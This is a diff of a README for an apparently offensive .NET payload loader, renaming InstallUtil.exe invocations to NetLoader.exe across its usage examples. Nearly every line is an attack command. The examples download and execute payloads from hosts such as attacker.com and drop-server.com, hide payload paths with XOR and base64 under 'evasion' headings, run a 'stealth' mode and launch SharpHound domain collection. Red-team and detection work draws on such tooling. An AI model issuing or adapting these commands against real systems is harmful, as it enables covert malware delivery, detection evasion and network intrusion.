@@ -37,46 +37,46 @@ Source code from:
 Basic Examples:
 ```powershell
 # Execute local binary
-InstallUtil.exe /path=C:\tools\payload.exe
+NetLoader.exe /path=C:\tools\payload.exe
 
 # Download and execute from URL
 InstallUtil.exe /path=http://attacker.com/payload.exe
 
 # With arguments for payload
-InstallUtil.exe /path=payload.exe /args="arg1,arg2,arg3"
+NetLoader.exe /path=payload.exe /args="arg1,arg2,arg3"
 ```
 Evasion Examples:
 ```powershell
 # XOR encrypted payload
-InstallUtil.exe /xor=MySecretKey123 /path=encrypted.bin
+NetLoader.exe /xor=MySecretKey123 /path=encrypted.bin
 
 # Base64 encoded parameters
-InstallUtil.exe /b64 /xor=U2VjcmV0S2V5 /path=aHR0cDovL2V4YW1wbGUuY29tL3A=
+NetLoader.exe /b64 /xor=U2VjcmV0S2V5 /path=aHR0cDovL2V4YW1wbGUuY29tL3A=
 
 # Debug mode with XOR encryption
-InstallUtil.exe /debug /xor=Password123 /path=http://server/encrypted.exe
+NetLoader.exe /debug /xor=Password123 /path=http://server/encrypted.exe
 ```
 Advanced Examples:
 ```powershell
 # Full evasion chain: Base64 + XOR + URL
-InstallUtil.exe /b64 /xor=S2V5 /path=aHR0cHM6Ly9zZXJ2ZXIvcGF5bG9hZC5lbmM= /args=YXJnMSx5ZWFo
+NetLoader.exe /b64 /xor=S2V5 /path=aHR0cHM6Ly9zZXJ2ZXIvcGF5bG9hZC5lbmM= /args=YXJnMSx5ZWFo
 
 # Local file with debug and XOR
-InstallUtil.exe /debug /xor=0xDEADBEEF /path=malware.enc
+NetLoader.exe /debug /xor=0xDEADBEEF /path=malware.enc
 
 # HTTPS download with arguments
-InstallUtil.exe /path=https://cdn.com/tool.exe /args="mode=stealth,target=192.168.1.10"
+NetLoader.exe /path=https://cdn.com/tool.exe /args="mode=stealth,target=192.168.1.10"
 ```
 Real-World Scenarios:
 ```powershell
 # Red Team OPSEC: Encrypted download with debug
-InstallUtil.exe /debug /xor=OpSecKey2024 /path=https://drop-server.com/stage2.enc
+NetLoader.exe /debug /xor=OpSecKey2024 /path=https://drop-server.com/stage2.enc
 
 # Penetration Test: Local execution with arguments
-InstallUtil.exe /path=SharpHound.exe /args="--CollectionMethod All --Domain corp.local"
+NetLoader.exe /path=SharpHound.exe /args="--CollectionMethod All --Domain corp.local"
 
 # Malware Analysis: Debug mode to trace execution
-InstallUtil.exe /debug /path=suspicious.bin /args="analyze,log,report"
+NetLoader.exe /debug /path=suspicious.bin /args="analyze,log,report"
 ```
 
 ## OSEP-like execution
